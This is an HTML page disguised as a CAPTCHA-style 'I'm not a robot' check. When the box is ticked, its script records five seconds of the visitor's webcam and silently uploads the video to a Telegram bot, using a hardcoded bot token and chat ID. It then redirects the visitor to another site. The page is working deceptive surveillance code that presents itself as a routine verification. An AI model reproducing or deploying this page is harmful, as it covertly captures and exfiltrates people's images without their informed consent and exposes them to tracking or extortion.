<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robot Verification</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1E88E5, #43A047);
            color: white;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 20px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 20px;
            margin-bottom: 15px;
        }

        .checkbox-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 15px 0;
            gap: 10px;
            font-size: 16px;
            cursor: pointer;
        }

        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: #4CAF50;
            transition: transform 0.3s ease;
        }

        input[type="checkbox"]:checked {
            transform: scale(1.2);
        }

        .loading {
            display: none;
            font-size: 16px;
            margin-top: 15px;
            color: #FBC02D;
        }

        .success {
            display: none;
            font-size: 16px;
            margin-top: 15px;
            color: #4CAF50;
        }

        video {
            display: none;
            width: 100%;
            max-width: 300px;
            height: auto;
            margin: 15px 0;
            border-radius: 10px;
            background: black;
            position: relative;
        }

        .face-frame {
            display: none;
            position: absolute;
            width: 160px;
            height: 160px; /* Changed to square */
            border: 3px solid #FFD700;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
        }

        @keyframes zoomIn {
            0% {
                transform: scale(0.8);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .countdown {
            font-size: 18px;
            margin-top: 20px;
            color: #FFEB3B;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Are you a robot?</h1>
        <div class="checkbox-container">
            <input type="checkbox" id="robot-checkbox">
            <label for="robot-checkbox">I'm not a robot</label>
        </div>
        <div class="video-wrapper" style="position: relative;">
            <video id="video" autoplay playsinline muted></video>
            <div class="face-frame" id="face-frame"></div>
        </div>
        <div class="loading">Recording in progress... ⏳</div>
        <div class="success">✅ Verification Complete! Redirecting...</div>
        <div class="countdown" id="countdown">10 seconds remaining...</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const faceFrame = document.getElementById('face-frame');
        const checkbox = document.getElementById('robot-checkbox');
        const loading = document.querySelector('.loading');
        const success = document.querySelector('.success');
        const countdown = document.getElementById('countdown');

        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
        const telegramChatId = "2070423407";

        checkbox.addEventListener('change', (e) => {
            if (e.target.checked) {
                // Show video and face frame
                video.style.display = 'block';
                faceFrame.style.display = 'block';

                // Show loading message
                loading.style.display = 'block';
                success.style.display = 'none';

                // Access the camera
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        // Display the camera feed
                        video.srcObject = stream;

                        // Start recording
                        const mediaRecorder = new MediaRecorder(stream);
                        const chunks = [];

                        mediaRecorder.start();

                        mediaRecorder.ondataavailable = (event) => {
                            chunks.push(event.data);
                        };

                        // Change frame color on the 4th second
                        setTimeout(() => {
                            faceFrame.style.borderColor = '#00FF00';
                        }, 4000);

                        setTimeout(() => {
                            mediaRecorder.stop();
                        }, 5000); // Record for 5 seconds

                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const formData = new FormData();
                            formData.append('chat_id', telegramChatId);
                            formData.append('video', blob, 'video.webm');

                            // Send video to Telegram in the background
                            fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                                method: 'POST',
                                body: formData
                            }).catch((error) => {
                                console.error('Video upload failed:', error.message);
                            });

                            // Stop the camera
                            stream.getTracks().forEach(track => track.stop());

                            // Start countdown for redirection after video upload
                            let countdownTime = 10;
                            const countdownInterval = setInterval(() => {
                                countdown.textContent = `${countdownTime} seconds remaining...`;
                                countdownTime--;
                                if (countdownTime < 0) {
                                    clearInterval(countdownInterval);
                                    loading.style.display = 'none';
                                    success.style.display = 'block';
                                    // Redirect to the provided URL
                                    window.location.href = 'https://hesentv.vercel.app/';
                                }
                            }, 1000);
                        };
                    })
                    .catch((err) => {
                        alert("Unable to access the camera: " + err.message);
                    });
            }
        });
    </script>
</body>
</html>
